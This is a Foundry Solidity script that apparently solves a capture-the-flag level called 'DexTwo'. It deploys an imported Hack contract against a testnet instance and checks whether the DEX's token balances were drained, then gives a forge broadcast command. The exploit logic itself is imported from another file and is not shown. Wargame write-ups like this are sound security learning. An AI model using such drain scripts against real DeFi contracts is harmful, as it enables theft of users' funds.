// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, DexTwo} from "../src/level23.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Level23Script is Script {
    function run(address instanceAddress) external {
        DexTwo target = DexTwo(instanceAddress);
        address t1 = target.token1();
        address t2 = target.token2();
        IERC20 token1 = IERC20(t1);
        IERC20 token2 = IERC20(t2);

        {
            uint256 dexBal1Before = target.balanceOf(t1, address(target));
            uint256 dexBal2Before = target.balanceOf(t2, address(target));
            console.log("Dex token1 balance before:", dexBal1Before);
            console.log("Dex token2 balance before:", dexBal2Before);
        }

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        {
            uint256 dexBal1After = target.balanceOf(t1, address(target));
            uint256 dexBal2After = target.balanceOf(t2, address(target));
            console.log("Dex token1 balance after:", dexBal1After);
            console.log("Dex token2 balance after:", dexBal2After);
            console.log(
                "Attack successful:",
                dexBal1After == 0 || dexBal2After == 0
            );
        }
    }
}
//forge script script/level23.s.sol:Level23Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
